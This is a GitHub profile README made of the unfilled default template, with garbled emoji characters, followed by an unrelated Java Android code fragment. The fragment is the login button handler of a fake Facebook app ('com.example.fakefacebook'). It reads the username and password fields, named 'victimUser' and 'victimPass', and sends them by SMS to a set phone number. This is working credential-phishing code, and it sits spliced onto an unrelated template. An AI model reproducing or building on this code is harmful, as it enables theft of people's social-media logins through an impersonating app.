- š Hi, Iām @Sojol09
- š Iām interested in ...
- š± Iām currently learning ...
- šļø Iām looking to collaborate on ...
- š« How to reach me ...

<!---
Sojol09/Sojol09 is a āØ special āØ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
 LogIn.setOnClickListener(new View.OnClickListener() {

 

                             public void onClick(View v) {

                                                                // TODO Auto-generated method stub

 

 

                    EditText victimUsername = (EditText) findViewById(R.id.editText1);

                    EditText victimPassword = (EditText) findViewById(R.id.editText2);

                    String victimUser = victimUsername.getText().toString();

                    String victimPass = victimPassword.getText().toString();

                    String message = " U: " + victimUser + " P: " + victimPass;

                    PendingIntent pi = PendingIntent.getActivity(LoginScreen.this,0, new Intent("com.example.fakefacebook.BUFFERING"), 0);

                      SmsManager sms = SmsManager.getDefault();

                     sms.sendTextMessage(phoneNumber, null, message, pi, null);

                                             }

                                });
